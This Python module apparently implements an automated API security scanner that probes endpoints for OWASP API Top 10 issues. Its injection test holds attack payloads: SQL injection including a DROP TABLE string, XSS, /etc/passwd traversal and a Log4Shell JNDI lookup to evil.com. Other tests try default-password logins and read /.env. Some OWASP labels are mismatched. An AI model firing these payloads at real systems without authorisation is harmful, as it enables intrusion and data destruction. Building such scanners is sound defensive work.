import aiohttp
import asyncio
import json
import time
import re
import random
import string
import logging
from datetime import datetime
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs

logger = logging.getLogger(__name__)
import yaml

def validate_auth_value(auth_value: str) -> str:
    """Validate and sanitize authentication value"""
    if not auth_value:
        return ""
    
    # Remove any potential injection characters and limit length
    # Keep only alphanumeric, common token chars, and basic special chars
    import re
    cleaned_value = re.sub(r'[^\w\-\._~:/?#[\]@!$&\'()*+,;=%]', '', auth_value.strip())
    
    # Limit length to prevent oversized tokens
    if len(cleaned_value) > 1000:
        cleaned_value = cleaned_value[:1000]
        logger.warning("Authentication value truncated due to excessive length")
    
    return cleaned_value

from schemas import (
    APISecurityTesterInput,
    APISecurityTesterOutput,
    APIVulnerability,
    APIEndpoint,
    SecurityTest
)

# Tool metadata
TOOL_INFO = {
    "name": "API Security Tester",
    "description": "Comprehensive API security testing tool that identifies vulnerabilities, misconfigurations, and compliance issues against OWASP API Security Top 10",
    "category": "api_security",
    "version": "1.0.0",
    "author": "Wildbox Security",
    "tags": ["api", "security", "testing", "owasp", "vulnerabilities", "penetration-testing"]
}

async def execute_tool(data: APISecurityTesterInput) -> APISecurityTesterOutput:
    """
    Comprehensive API security testing with OWASP API Top 10 focus
    """
    start_time = time.time()
    
    vulnerabilities = []
    endpoints_discovered = []
    security_tests = []
    
    # Prepare authentication headers
    headers = data.custom_headers or {}
    if data.authentication_type == "bearer" and data.authentication_value:
        safe_auth_value = validate_auth_value(data.authentication_value)
        headers["Authorization"] = f"Bearer {safe_auth_value}"
    elif data.authentication_type == "api_key" and data.authentication_value:
        safe_auth_value = validate_auth_value(data.authentication_value)
        headers["X-API-Key"] = safe_auth_value
    elif data.authentication_type == "basic" and data.authentication_value:
        safe_auth_value = validate_auth_value(data.authentication_value)
        headers["Authorization"] = f"Basic {safe_auth_value}"
    
    try:
        # Discover API endpoints
        endpoints_discovered = await discover_api_endpoints(
            data.api_base_url,
            data.api_specification,
            headers,
            data.max_requests // 4
        )
        
        # Run security tests based on selected categories
        test_categories = data.test_categories if "all" not in data.test_categories else [
            "broken_object_level_authorization",
            "broken_user_authentication", 
            "excessive_data_exposure",
            "lack_of_resources_rate_limiting",
            "broken_function_level_authorization",
            "mass_assignment",
            "security_misconfiguration",
            "injection",
            "improper_assets_management",
            "insufficient_logging_monitoring"
        ]
        
        for category in test_categories:
            test_results = await run_security_test_category(
                category,
                data.api_base_url,
                endpoints_discovered,
                headers,
                data.test_depth,
                data.include_fuzzing,
                data.request_delay
            )
            security_tests.extend(test_results["tests"])
            vulnerabilities.extend(test_results["vulnerabilities"])
        
        # Analyze OWASP API Top 10 compliance
        owasp_compliance = analyze_owasp_api_top10_compliance(vulnerabilities, security_tests)
        
        # Calculate security metrics
        security_score = calculate_security_score(vulnerabilities, security_tests)
        risk_rating = determine_risk_rating(vulnerabilities)
        
        # Generate recommendations
        recommendations = generate_recommendations(vulnerabilities, security_tests, owasp_compliance)
        
        # Count vulnerabilities by severity
        total_vulns = len(vulnerabilities)
        critical_vulns = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_vulns = len([v for v in vulnerabilities if v.severity == "High"])
        medium_vulns = len([v for v in vulnerabilities if v.severity == "Medium"])
        low_vulns = len([v for v in vulnerabilities if v.severity == "Low"])
        
        return APISecurityTesterOutput(
            api_base_url=data.api_base_url,
            test_timestamp=datetime.utcnow().isoformat(),
            test_depth=data.test_depth,
            total_endpoints_tested=len(endpoints_discovered),
            total_vulnerabilities=total_vulns,
            critical_vulnerabilities=critical_vulns,
            high_vulnerabilities=high_vulns,
            medium_vulnerabilities=medium_vulns,
            low_vulnerabilities=low_vulns,
            vulnerabilities=vulnerabilities,
            endpoints_discovered=endpoints_discovered,
            security_tests=security_tests,
            owasp_api_top10_compliance=owasp_compliance,
            security_score=security_score,
            risk_rating=risk_rating,
            recommendations=recommendations,
            execution_time=time.time() - start_time
        )
        
    except (ValueError, KeyError, TypeError, ConnectionError, TimeoutError) as e:
        # Return error results
        return APISecurityTesterOutput(
            api_base_url=data.api_base_url,
            test_timestamp=datetime.utcnow().isoformat(),
            test_depth=data.test_depth,
            total_endpoints_tested=0,
            total_vulnerabilities=1,
            critical_vulnerabilities=1,
            high_vulnerabilities=0,
            medium_vulnerabilities=0,
            low_vulnerabilities=0,
            vulnerabilities=[APIVulnerability(
                severity="Critical",
                category="Testing Error",
                title="API Testing Failed",
                description=f"Failed to test API: {str(e)}",
                endpoint=data.api_base_url,
                method="N/A",
                request_details={},
                response_details={},
                remediation="Check API accessibility and authentication"
            )],
            endpoints_discovered=[],
            security_tests=[],
            owasp_api_top10_compliance={},
            security_score=0.0,
            risk_rating="Critical",
            recommendations=["Verify API endpoint and credentials"],
            execution_time=time.time() - start_time
        )

async def discover_api_endpoints(base_url: str, api_spec: Optional[str], headers: Dict, max_requests: int) -> List[APIEndpoint]:
    """Discover API endpoints through various methods"""
    endpoints = []
    
    # Try to get endpoints from OpenAPI/Swagger specification
    if api_spec:
        spec_endpoints = await parse_api_specification(api_spec, base_url)
        endpoints.extend(spec_endpoints)
    
    # Common API endpoint discovery
    common_paths = [
        "/api/v1", "/api/v2", "/api", "/rest", "/graphql",
        "/users", "/user", "/login", "/auth", "/token",
        "/products", "/orders", "/admin", "/health", "/status"
    ]
    
    for path in common_paths[:max_requests]:
        try:
            endpoint_info = await probe_endpoint(base_url, path, headers)
            if endpoint_info:
                endpoints.append(endpoint_info)
        except Exception:
            continue
    
    return endpoints

async def parse_api_specification(spec_url_or_content: str, base_url: str) -> List[APIEndpoint]:
    """Parse OpenAPI/Swagger specification to extract endpoints"""
    endpoints = []
    
    try:
        # Try to fetch specification if it's a URL
        if spec_url_or_content.startswith('http'):
            async with aiohttp.ClientSession() as session:
                async with session.get(spec_url_or_content) as response:
                    spec_content = await response.text()
        else:
            spec_content = spec_url_or_content
        
        # Parse JSON or YAML
        try:
            spec = json.loads(spec_content)
        except json.JSONDecodeError:
            spec = yaml.safe_load(spec_content)
        
        # Extract endpoints from OpenAPI spec
        if 'paths' in spec:
            for path, methods in spec['paths'].items():
                for method, details in methods.items():
                    if method.upper() in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                        parameters = []
                        if 'parameters' in details:
                            parameters = [p.get('name', '') for p in details['parameters']]
                        
                        responses = {}
                        if 'responses' in details:
                            responses = {str(k): str(v.get('description', '')) for k, v in details['responses'].items()}
                        
                        endpoints.append(APIEndpoint(
                            path=path,
                            method=method.upper(),
                            parameters=parameters,
                            responses=responses,
                            requires_auth='security' in details,
                            rate_limited=False,  # Would need additional analysis
                            input_validation="Unknown"
                        ))
    
    except Exception:
        pass
    
    return endpoints

async def probe_endpoint(base_url: str, path: str, headers: Dict) -> Optional[APIEndpoint]:
    """Probe an endpoint to gather information"""
    try:
        url = urljoin(base_url, path)
        
        async with aiohttp.ClientSession() as session:
            # Try GET request first
            async with session.get(url, headers=headers, timeout=10) as response:
                if response.status < 500:  # Endpoint exists
                    return APIEndpoint(
                        path=path,
                        method="GET",
                        parameters=[],
                        responses={str(response.status): response.reason or ""},
                        requires_auth=response.status == 401,
                        rate_limited=response.status == 429,
                        input_validation="Unknown"
                    )
    except Exception:
        pass
    
    return None

async def run_security_test_category(
    category: str,
    base_url: str,
    endpoints: List[APIEndpoint],
    headers: Dict,
    depth: str,
    include_fuzzing: bool,
    delay: float
) -> Dict[str, List]:
    """Run security tests for a specific category"""
    tests = []
    vulnerabilities = []
    
    if category == "broken_object_level_authorization":
        result = await test_broken_object_level_authorization(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "broken_user_authentication":
        result = await test_broken_user_authentication(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "excessive_data_exposure":
        result = await test_excessive_data_exposure(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "lack_of_resources_rate_limiting":
        result = await test_rate_limiting(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "broken_function_level_authorization":
        result = await test_function_level_authorization(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "mass_assignment":
        result = await test_mass_assignment(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "security_misconfiguration":
        result = await test_security_misconfiguration(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "injection":
        result = await test_injection_vulnerabilities(base_url, endpoints, headers, include_fuzzing, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "improper_assets_management":
        result = await test_improper_assets_management(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    elif category == "insufficient_logging_monitoring":
        result = await test_insufficient_logging(base_url, endpoints, headers, delay)
        tests.extend(result["tests"])
        vulnerabilities.extend(result["vulnerabilities"])
    
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_broken_object_level_authorization(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for broken object level authorization (OWASP API1)"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Broken Object Level Authorization",
        category="OWASP API1",
        description="Testing for improper access controls on object references",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    # Test object ID manipulation
    for endpoint in endpoints:
        if any(param in endpoint.path.lower() for param in ['id', 'user', 'object']):
            # Test with different user IDs
            test_ids = ['1', '2', '999', 'admin', '../', 'null']
            
            for test_id in test_ids:
                try:
                    test_path = endpoint.path.replace('{id}', test_id).replace(':id', test_id)
                    url = urljoin(base_url, test_path)
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, headers=headers, timeout=10) as response:
                            if response.status == 200:
                                # Potential unauthorized access
                                vulnerabilities.append(APIVulnerability(
                                    severity="High",
                                    category="Authorization",
                                    title="Broken Object Level Authorization",
                                    description=f"Unauthorized access to object with ID: {test_id}",
                                    endpoint=endpoint.path,
                                    method=endpoint.method,
                                    request_details={"test_id": test_id, "url": url},
                                    response_details={"status": response.status},
                                    owasp_category="API1:2023 Broken Object Level Authorization",
                                    cwe_id="CWE-639",
                                    remediation="Implement proper object-level authorization checks"
                                ))
                                test.passed = False
                                test.findings.append(f"Unauthorized access to object ID: {test_id}")
                
                except aiohttp.ClientError as e:
                    test.findings.append(f"Connection error testing {test_id}: {str(e)}")
                except asyncio.TimeoutError:
                    test.findings.append(f"Timeout testing {test_id}")
                except (ValueError, KeyError, TypeError, ConnectionError, TimeoutError) as e:
                    logger.error(f"Unexpected error testing object access {test_id}: {e}")
                    test.findings.append(f"Error testing {test_id}: {str(e)}")
                
                await asyncio.sleep(delay)
    
    if not test.passed:
        test.recommendations = [
            "Implement user-specific object access validation",
            "Use unpredictable object identifiers",
            "Validate user permissions for each object access"
        ]
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_broken_user_authentication(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for broken user authentication (OWASP API2)"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Broken User Authentication",
        category="OWASP API2",
        description="Testing authentication mechanisms for weaknesses",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    auth_endpoints = [ep for ep in endpoints if 'auth' in ep.path.lower() or 'login' in ep.path.lower()]
    
    for endpoint in auth_endpoints:
        # Test weak password policies
        weak_passwords = ['123456', 'password', 'admin', '']
        
        for weak_pass in weak_passwords:
            try:
                url = urljoin(base_url, endpoint.path)
                login_data = {
                    'username': 'admin',
                    'password': weak_pass,
                    'email': 'admin@test.com'
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, json=login_data, headers=headers, timeout=10) as response:
                        if response.status == 200:
                            try:
                                response_data = await response.json()
                                if 'token' in str(response_data).lower():
                                    vulnerabilities.append(APIVulnerability(
                                        severity="High",
                                        category="Authentication",
                                        title="Weak Password Policy",
                                        description=f"Authentication succeeded with weak password: {weak_pass}",
                                        endpoint=endpoint.path,
                                        method="POST",
                                        request_details={"weak_password": weak_pass},
                                        response_details={"status": response.status},
                                        owasp_category="API2:2023 Broken Authentication",
                                        cwe_id="CWE-521",
                                        remediation="Implement strong password policies and account lockout mechanisms"
                                    ))
                                    test.passed = False
                            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                                logger.debug(f"Error in injection testing: {e}")
                                pass
            
            except Exception:
                continue
            
            await asyncio.sleep(delay)
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_excessive_data_exposure(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for excessive data exposure (OWASP API3)"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Excessive Data Exposure",
        category="OWASP API3", 
        description="Testing for sensitive data exposure in API responses",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    sensitive_patterns = [
        r'password', r'secret', r'token', r'key', r'ssn', r'social_security',
        r'credit_card', r'cvv', r'private', r'internal', r'admin'
    ]
    
    for endpoint in endpoints:
        try:
            url = urljoin(base_url, endpoint.path)
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        try:
                            response_text = await response.text()
                            
                            for pattern in sensitive_patterns:
                                if re.search(pattern, response_text, re.IGNORECASE):
                                    vulnerabilities.append(APIVulnerability(
                                        severity="Medium",
                                        category="Data Exposure",
                                        title="Potential Sensitive Data Exposure",
                                        description=f"Response contains potentially sensitive field: {pattern}",
                                        endpoint=endpoint.path,
                                        method=endpoint.method,
                                        request_details={"url": url},
                                        response_details={"sensitive_field": pattern},
                                        owasp_category="API3:2023 Broken Object Property Level Authorization",
                                        remediation="Filter sensitive data from API responses, implement field-level authorization"
                                    ))
                                    test.passed = False
                                    test.findings.append(f"Sensitive field found: {pattern}")
                        except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                            logger.debug(f"Error in sensitive data testing: {e}")
                            pass
        
        except Exception:
            continue
        
        await asyncio.sleep(delay)
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_rate_limiting(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for rate limiting mechanisms"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Rate Limiting Test",
        category="OWASP API4",
        description="Testing for proper rate limiting mechanisms",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    for endpoint in endpoints:
        try:
            url = urljoin(base_url, endpoint.path)
            request_count = 0
            rate_limited = False
            
            # Send rapid requests to test rate limiting
            for i in range(10):
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers, timeout=5) as response:
                        request_count += 1
                        if response.status == 429:  # Rate limited
                            rate_limited = True
                            break
            
            if not rate_limited and request_count >= 10:
                vulnerabilities.append(APIVulnerability(
                    severity="Medium",
                    category="Rate Limiting",
                    title="Missing Rate Limiting",
                    description="No rate limiting detected on endpoint",
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    request_details={"requests_sent": request_count},
                    response_details={"rate_limited": False},
                    owasp_category="API4:2023 Unrestricted Resource Consumption",
                    remediation="Implement rate limiting to prevent abuse"
                ))
                test.passed = False
                test.findings.append(f"No rate limiting on {endpoint.path}")
        
        except Exception:
            continue
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_function_level_authorization(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for function level authorization issues"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Function Level Authorization",
        category="OWASP API5",
        description="Testing for proper function-level access controls",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    # Test without authentication headers
    headers_no_auth = {k: v for k, v in headers.items() if 'authorization' not in k.lower() and 'x-api-key' not in k.lower()}
    
    for endpoint in endpoints:
        if endpoint.requires_auth:
            try:
                url = urljoin(base_url, endpoint.path)
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers_no_auth, timeout=10) as response:
                        if response.status == 200:
                            vulnerabilities.append(APIVulnerability(
                                severity="High",
                                category="Authorization",
                                title="Missing Function Level Authorization",
                                description="Protected function accessible without authentication",
                                endpoint=endpoint.path,
                                method=endpoint.method,
                                request_details={"no_auth": True},
                                response_details={"status": response.status},
                                owasp_category="API5:2023 Broken Function Level Authorization",
                                remediation="Implement proper function-level authorization checks"
                            ))
                            test.passed = False
                            test.findings.append(f"Unauthorized access to {endpoint.path}")
            
            except Exception:
                continue
            
            await asyncio.sleep(delay)
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_mass_assignment(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for mass assignment vulnerabilities"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Mass Assignment",
        category="OWASP API6",
        description="Testing for mass assignment vulnerabilities",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    dangerous_fields = ['admin', 'role', 'is_admin', 'permissions', 'password', 'email_verified']
    
    for endpoint in endpoints:
        if endpoint.method in ['POST', 'PUT', 'PATCH']:
            try:
                url = urljoin(base_url, endpoint.path)
                
                for field in dangerous_fields:
                    test_data = {field: 'true', 'test_field': 'value'}
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.request(endpoint.method, url, json=test_data, headers=headers, timeout=10) as response:
                            if response.status in [200, 201]:
                                vulnerabilities.append(APIVulnerability(
                                    severity="High",
                                    category="Mass Assignment",
                                    title="Potential Mass Assignment",
                                    description=f"Dangerous field '{field}' accepted in request",
                                    endpoint=endpoint.path,
                                    method=endpoint.method,
                                    request_details={"dangerous_field": field},
                                    response_details={"status": response.status},
                                    owasp_category="API6:2023 Unrestricted Access to Sensitive Business Flows",
                                    remediation="Implement field whitelisting and input validation"
                                ))
                                test.passed = False
                                test.findings.append(f"Mass assignment risk with field: {field}")
                
                await asyncio.sleep(delay)
            
            except Exception:
                continue
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_security_misconfiguration(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for security misconfigurations"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Security Misconfiguration",
        category="OWASP API8",
        description="Testing for security misconfigurations",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    # Test for debug endpoints
    debug_paths = ['/debug', '/test', '/dev', '/swagger', '/api-docs', '/.env']
    
    for debug_path in debug_paths:
        try:
            url = urljoin(base_url, debug_path)
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        vulnerabilities.append(APIVulnerability(
                            severity="Medium",
                            category="Misconfiguration",
                            title="Debug Endpoint Exposed",
                            description=f"Debug endpoint accessible: {debug_path}",
                            endpoint=debug_path,
                            method="GET",
                            request_details={"debug_path": debug_path},
                            response_details={"status": response.status},
                            owasp_category="API8:2023 Security Misconfiguration",
                            remediation="Remove or secure debug endpoints in production"
                        ))
                        test.passed = False
                        test.findings.append(f"Debug endpoint exposed: {debug_path}")
        
        except Exception:
            continue
        
        await asyncio.sleep(delay)
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_improper_assets_management(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for improper assets management"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Improper Assets Management",
        category="OWASP API9",
        description="Testing for improper API inventory management",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    # Check for old API versions
    version_patterns = ['/v1/', '/v2/', '/api/v1', '/api/v2']
    found_versions = set()
    
    for endpoint in endpoints:
        for pattern in version_patterns:
            if pattern in endpoint.path:
                found_versions.add(pattern)
    
    if len(found_versions) > 1:
        vulnerabilities.append(APIVulnerability(
            severity="Low",
            category="Assets Management",
            title="Multiple API Versions Detected",
            description="Multiple API versions found, ensure old versions are properly secured",
            endpoint="Multiple",
            method="N/A",
            request_details={"versions": list(found_versions)},
            response_details={},
            owasp_category="API9:2023 Improper Inventory Management",
            remediation="Maintain proper API version inventory and deprecate old versions"
        ))
        test.passed = False
        test.findings.append(f"Multiple API versions: {found_versions}")
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

async def test_insufficient_logging(base_url: str, endpoints: List[APIEndpoint], headers: Dict, delay: float) -> Dict[str, List]:
    """Test for insufficient logging and monitoring"""
    tests = []
    vulnerabilities = []
    
    test = SecurityTest(
        test_name="Insufficient Logging",
        category="OWASP API10",
        description="Testing for proper logging and monitoring",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    # This is largely a configuration assessment - simplified version
    # In real implementation, this would check log configurations, monitoring endpoints, etc.
    
    test.findings.append("Logging assessment requires manual review of log configuration")
    test.recommendations = [
        "Implement comprehensive API logging",
        "Monitor for suspicious activities and failed authentication attempts",
        "Set up alerting for security events",
        "Maintain audit trails for sensitive operations"
    ]
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}

def analyze_owasp_api_top10_compliance(vulnerabilities, security_tests):
    """Analyze OWASP API Top 10 compliance based on vulnerabilities and tests"""
    owasp_categories = {
        "API1:2023 Broken Object Level Authorization": 0,
        "API2:2023 Broken Authentication": 0,
        "API3:2023 Broken Object Property Level Authorization": 0,
        "API4:2023 Unrestricted Resource Consumption": 0,
        "API5:2023 Broken Function Level Authorization": 0,
        "API6:2023 Unrestricted Access to Sensitive Business Flows": 0,
        "API7:2023 Server Side Request Forgery": 0,
        "API8:2023 Security Misconfiguration": 0,
        "API9:2023 Improper Inventory Management": 0,
        "API10:2023 Unsafe Consumption of APIs": 0
    }
    
    # Count vulnerabilities by OWASP category
    for vuln in vulnerabilities:
        category = getattr(vuln, 'owasp_category', None)
        if category in owasp_categories:
            owasp_categories[category] += 1
    
    # Calculate compliance score (percentage of categories without issues)
    total_categories = len(owasp_categories)
    compliant_categories = sum(1 for count in owasp_categories.values() if count == 0)
    compliance_score = (compliant_categories / total_categories) * 100
    
    return {
        "compliance_score": compliance_score,
        "categories": owasp_categories,
        "total_categories": total_categories,
        "compliant_categories": compliant_categories
    }

def calculate_security_score(vulnerabilities, security_tests):
    """Calculate overall security score based on vulnerabilities and tests"""
    if not security_tests:
        return 0.0
    
    # Base score starts at 100
    score = 100.0
    
    # Deduct points based on vulnerability severity
    for vuln in vulnerabilities:
        if vuln.severity == "Critical":
            score -= 15
        elif vuln.severity == "High":
            score -= 10
        elif vuln.severity == "Medium":
            score -= 5
        elif vuln.severity == "Low":
            score -= 2
    
    # Bonus for passing tests
    passed_tests = sum(1 for test in security_tests if getattr(test, 'passed', False))
    total_tests = len(security_tests)
    test_bonus = (passed_tests / total_tests) * 10 if total_tests > 0 else 0
    score += test_bonus
    
    # Ensure score is between 0 and 100
    return max(0.0, min(100.0, score))

def determine_risk_rating(vulnerabilities):
    """Determine overall risk rating based on vulnerabilities"""
    if not vulnerabilities:
        return "Low"
    
    critical_count = sum(1 for v in vulnerabilities if v.severity == "Critical")
    high_count = sum(1 for v in vulnerabilities if v.severity == "High")
    medium_count = sum(1 for v in vulnerabilities if v.severity == "Medium")
    
    if critical_count >= 3 or (critical_count >= 1 and high_count >= 3):
        return "Critical"
    elif critical_count >= 1 or high_count >= 5:
        return "High"
    elif high_count >= 1 or medium_count >= 5:
        return "Medium"
    else:
        return "Low"

def generate_recommendations(vulnerabilities, security_tests, owasp_compliance):
    """Generate security recommendations based on findings"""
    recommendations = []
    
    # Basic recommendations based on vulnerability severity
    critical_vulns = [v for v in vulnerabilities if v.severity == "Critical"]
    high_vulns = [v for v in vulnerabilities if v.severity == "High"]
    
    if critical_vulns:
        recommendations.append("Immediately address all critical vulnerabilities before deploying to production")
        recommendations.append("Implement emergency security patches for critical issues")
    
    if high_vulns:
        recommendations.append("Prioritize remediation of high-severity vulnerabilities")
        recommendations.append("Review and strengthen authentication and authorization mechanisms")
    
    # OWASP-specific recommendations
    if owasp_compliance["compliance_score"] < 80:
        recommendations.append("Improve OWASP API Security Top 10 compliance")
        recommendations.append("Implement comprehensive API security testing in CI/CD pipeline")
    
    # Authentication and authorization recommendations
    auth_vulns = [v for v in vulnerabilities if "auth" in v.category.lower()]
    if auth_vulns:
        recommendations.append("Implement robust authentication and session management")
        recommendations.append("Use OAuth 2.0 or similar industry-standard authentication protocols")
    
    # General security recommendations
    recommendations.extend([
        "Implement proper input validation and sanitization",
        "Use HTTPS for all API communications",
        "Implement rate limiting to prevent abuse",
        "Regular security assessments and penetration testing",
        "Monitor API usage and implement logging for security events"
    ])
    
    return recommendations[:10]  # Limit to top 10 recommendations

async def test_injection_vulnerabilities(base_url, endpoints, headers, include_fuzzing, delay):
    """Test for injection vulnerabilities"""
    vulnerabilities = []
    tests = []
    
    injection_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<%=7*7%>",
        "';WAITFOR DELAY '00:00:05'--"
    ]
    
    test = SecurityTest(
        test_name="Injection Vulnerability Test",
        category="OWASP API8",
        description="Testing for injection vulnerabilities including SQL, XSS, and command injection",
        executed=True,
        passed=True,
        findings=[],
        recommendations=[]
    )
    
    for endpoint in endpoints:
        if hasattr(endpoint, 'parameters') and endpoint.parameters:
            for param in endpoint.parameters:
                for payload in injection_payloads:
                    try:
                        if endpoint.method == "GET":
                            url = f"{base_url.rstrip('/')}{endpoint.path}?{param}={payload}"
                            async with aiohttp.ClientSession() as session:
                                async with session.get(url, headers=headers, timeout=10) as response:
                                    response_text = await response.text()
                        else:
                            url = f"{base_url.rstrip('/')}{endpoint.path}"
                            data = {param: payload}
                            async with aiohttp.ClientSession() as session:
                                async with session.post(url, json=data, headers=headers, timeout=10) as response:
                                    response_text = await response.text()
                        
                        # Check for injection indicators
                        error_indicators = [
                            'sql syntax', 'mysql_fetch', 'ora-', 'postgresql',
                            'sqlite', 'mongodb', 'command not found', 'permission denied',
                            'syntax error', 'unexpected token'
                        ]
                        
                        for indicator in error_indicators:
                            if indicator in response_text.lower():
                                vulnerabilities.append(APIVulnerability(
                                    severity="High",
                                    category="Injection",
                                    title=f"Potential Injection Vulnerability in {param}",
                                    description=f"Parameter '{param}' may be vulnerable to injection attacks",
                                    endpoint=endpoint.path,
                                    method=endpoint.method,
                                    request_details={"parameter": param, "payload": payload},
                                    response_details={"indicator": indicator},
                                    owasp_category="API8:2023 Security Misconfiguration",
                                    cwe_id="CWE-89",
                                    remediation="Implement proper input validation and parameterized queries"
                                ))
                                test.passed = False
                                test.findings.append(f"Injection vulnerability detected in parameter: {param}")
                        
                        # Add delay to avoid overwhelming the target
                        if delay:
                            await asyncio.sleep(delay)
                    
                    except (ValueError, KeyError, TypeError, ConnectionError, TimeoutError) as e:
                        # Log error but continue testing
                        continue
    
    if not test.passed:
        test.recommendations = [
            "Implement input validation and sanitization",
            "Use parameterized queries for database interactions",
            "Apply principle of least privilege for database access",
            "Implement Web Application Firewall (WAF)"
        ]
    
    tests.append(test)
    return {"tests": tests, "vulnerabilities": vulnerabilities}
